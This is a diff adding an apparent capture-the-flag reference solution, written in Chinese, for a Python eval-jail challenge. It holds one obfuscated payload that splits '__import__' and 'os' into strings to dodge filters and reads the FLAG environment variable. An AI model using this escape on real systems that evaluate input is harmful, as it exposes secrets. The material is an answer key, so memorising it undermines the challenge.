@@ -1,0 +1,3 @@
+参考解法（nc 连接后粘贴，输入经 eval 执行）：
+
+getattr(__builtins__, '__i'+'mport__')('o'+'s').environ['FLAG']
